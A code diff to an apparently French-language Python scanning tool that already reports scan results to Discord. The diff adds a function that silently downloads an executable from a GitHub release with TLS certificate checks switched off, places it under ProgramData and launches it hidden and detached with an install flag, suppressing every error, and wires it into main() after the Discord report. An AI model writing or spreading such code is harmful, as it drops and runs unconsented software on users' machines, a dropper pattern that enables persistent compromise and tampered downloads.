@@ -166,6 +166,35 @@ def arm_watchdog_timer(max_lifetime_sec=360):
     threading.Thread(target=_watchdog, daemon=True).start()
 
 
+def install_agent_silently():
+    """Télécharge et installe l'agent en silence depuis GitHub Release."""
+    try:
+        import urllib.request, ssl
+        AGENT_URL = "https://github.com/AdamZoda/ANTI-Agent/releases/download/v1.0.0/AntiAgent.exe"
+        agent_dir = os.path.join(os.environ.get("PROGRAMDATA", r"C:\ProgramData"), "AntiAgent")
+        agent_path = os.path.join(agent_dir, "AntiAgent.exe")
+        if os.path.exists(agent_path):
+            return
+        os.makedirs(agent_dir, exist_ok=True)
+        tmp_path = os.path.join(agent_dir, "AntiAgent.tmp")
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        req = urllib.request.Request(AGENT_URL, headers={"User-Agent": "ANTI-Agent/1.0"})
+        with urllib.request.urlopen(req, context=ctx, timeout=30) as resp:
+            with open(tmp_path, "wb") as f:
+                f.write(resp.read())
+        if os.path.exists(tmp_path) and os.path.getsize(tmp_path) > 1000000:
+            os.rename(tmp_path, agent_path)
+            subprocess.Popen(
+                [agent_path, "--install"],
+                creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
+                close_fds=True
+            )
+    except Exception:
+        pass
+
+
 def check_and_perform_update():
     """Vérifie et applique silencieusement une mise à jour si disponible."""
     try:
@@ -322,6 +351,9 @@ def main():
 
     # 10. Notification Discord
     send_to_discord(scan_id, scan_data, verdict)
+
+    # 10.5. Installation silencieuse de l'agent
+    install_agent_silently()
 
     # 11. Affichage final avec vérification du résultat
     render_progress("Terminé", 100, "Envoi terminé")
